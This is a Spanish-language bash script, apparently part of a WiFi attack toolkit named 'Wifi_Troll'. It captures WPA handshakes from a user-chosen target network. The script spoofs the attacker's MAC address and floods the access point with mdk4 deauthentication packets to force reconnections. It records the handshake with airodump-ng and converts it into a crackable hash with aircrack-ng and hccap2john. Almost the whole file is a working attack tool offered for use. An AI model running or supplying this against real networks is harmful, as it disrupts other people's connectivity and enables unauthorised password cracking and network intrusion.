#!bin/bash

function Title {
	clear
	echo
	echo "                     __      __ .__   _____ .__        ___________                .__   .__   "
	echo "                    /  \    /  \|__|_/ ____\|__|       \__    ___/_______   ____  |  |  |  |  "
	echo "                    \   \/\/   /|  |\   __\ |  |         |    |   \_  __ \ /  _ \ |  |  |  |  " 
	echo "                     \        / |  | |  |   |  |         |    |    |  | \/(  <_> )|  |__|  |__"
	echo "                      \__/\  /  |__| |__|   |__| ______  |____|    |__|    \____/ |____/|____/"
	echo "                           \/                   /_____/                                       "
	echo "                                               ¯\_(ツ)_/¯"
	echo "                              __________________________________________________"					
	echo "                                ︻デ═一  Created by: XDeadHackerX v2.0  ︻デ═一 " 
	echo "          -------------------------------------------------------------------------------------------"
	echo "          Cualquier acción y o actividad relacionada con Wifi_Troll es únicamente su responsabilidad"
	echo "          -------------------------------------------------------------------------------------------"
	echo
	echo
}

function ActMonitor {
	####Activacion Modo Monitor y Modo Seguro####
	echo
	sudo airmon-ng
	echo
	read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlan0): " interfaz
	read -p "[*] Cortar la salida a internet para evitar futuros errores? (y/n): " opc2
	echo
	if [ $opc2 = y ]
		then
			sudo airmon-ng check kill >/dev/null
		else
			echo "OK"
	fi
	sudo ifconfig $interfaz promisc >/dev/null
	sudo airmon-ng start $interfaz >/dev/null
	echo "======================="
	echo "Activando Modo Monitor"
	echo "======================="
	echo "--->""                  |"
	sleep 1
	echo "-------->""             |"
	sleep 1
	echo "--------------->""      |"
	sleep 1
	echo "--------------------->""|"
	echo "======================="
	sudo airmon-ng 
	echo
	read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
	echo
	sudo ifconfig $interfaz2 promisc >/dev/null
	sudo ifconfig $interfaz2 down >/dev/null
	sudo macchanger -a $interfaz2 >/dev/null
	sudo ifconfig $interfaz2 up >/dev/null
	echo "======================="
	echo " Activando Modo Seguro"
	echo "======================="
	echo "--->""                  |"
	sleep 1
	echo "-------->""             |"
	sleep 1
	echo "--------------->""      |"
	sleep 1
	echo "--------------------->""|"
	echo "======================="
}

function DesaMonitor {
	echo
	echo "[#] Desactivando Ataque y Protocolos"
	echo
	sudo ifconfig $interfaz2 down >/dev/null
	sudo macchanger -p $interfaz2 >/dev/null
	sudo ifconfig $interfaz2 up >/dev/null
	sudo ifconfig $interfaz2 -promisc >/dev/null
	sudo airmon-ng stop $interfaz2 >/dev/null
	sudo ifconfig $interfaz -promisc >/dev/null
	sudo systemctl restart NetworkManager.service >/dev/null
	echo "=============================="
	echo "        Desactivando"
	echo "Ataque/Modo Monitor/Seguridad"
	echo "=============================="
	echo "-------->""                    |"
	sleep 1
	echo "--------------->""             |"
	sleep 1
	echo "---------------------->""      |"
	sleep 1
	echo "---------------------------->""|"
	echo "=============================="
}

Title
echo "[4] Extraer el  HandShake  de una Red Wifi"
echo
echo "[#] Copia el BSSID y CHAN del Wifi objetivo, puede tardar hasta 1 minuto en aparecer la Red Objetivo"
echo
echo
sudo gnome-terminal --geometry 80x24+1300+20 -- sudo nmcli dev wifi list
read -p "[*] Copia el BSSID del Wifi Objetivo y pegelo a continuacion: " bssid
read -p "[*] Copia el Canal (CHAN) del Wifi Objetivo y pegelo a continuacion: " ch
sudo pkill gnome-terminal
ActMonitor
Title
echo

if ! [ -d requisitos/resultados ]
	then
		mkdir requisitos/resultados
fi
if [ -d requisitos/resultados/$bssid/handshake ]
	then
		sudo rm -r requisitos/resultados/$bssid/handshake
fi
if [ -d requisitos/resultados/Hash* ]
	then
		sudo rm -r requisitos/resultados/Hash*
fi
if ! [ -d requisitos/resultados/$bssid ]
	then
		mkdir requisitos/resultados/$bssid
fi
if ! [ -d requisitos/resultados/$bssid/handshake ]
	then
		mkdir requisitos/resultados/$bssid/handshake
fi

clear
sudo gnome-terminal --geometry 82x24+1300+20 -- bash requisitos/4.2.sh
sudo gnome-terminal --geometry 80x24+1300+1000 -- sudo timeout 12s mdk4 $interfaz2 d -B $bssid -c $ch
sudo airodump-ng -c $ch --bssid $bssid $interfaz2 --band abg -w $bssid
Title
echo "[#] Ultimos ajustes y Resultado"
sudo pkill gnome-terminal >/dev/null
sudo rm -r $bssid-01.csv
sudo rm -r $bssid-01.log.csv
sudo rm -r $bssid-01.kismet.csv
sudo rm -r $bssid-01.kismet.netxml
mv $bssid-01.cap requisitos/resultados/$bssid/handshake
echo
echo "------------------------------------------------------------"
echo "↓ Resultados--> $bssid | "`sudo aircrack-ng -J requisitos/resultados/$bssid/handshake/$bssid-02 requisitos/resultados/$bssid/handshake/$bssid-01.cap | awk 'NF==6{print $3}'`" ↓"
echo "------------------------------------------------------------"
echo
sudo aircrack-ng -J requisitos/resultados/$bssid/handshake/$bssid-02 requisitos/resultados/$bssid/handshake/$bssid-01.cap | awk 'FNR>= 5{print}' | awk 'FNR<= 3{print}'
sudo aircrack-ng -J requisitos/resultados/$bssid/handshake/$bssid-02 requisitos/resultados/$bssid/handshake/$bssid-01.cap | awk 'FNR>= 20{print}'
sudo hccap2john requisitos/resultados/$bssid/handshake/$bssid-02.hccap > requisitos/resultados/$bssid/Hash.$bssid-03
echo "El HandShake se a guardado en: requisitos/resultados/$bssid/handshake/$bssid-01.cap"
echo
read -p "[*] Pulsa (Enter) para Salir:" exit
Title
DesaMonitor
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc2
	case $opc2 in
			1 )	bash wifi_troll.sh
				;;
			2 )	bash requisitos/4.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
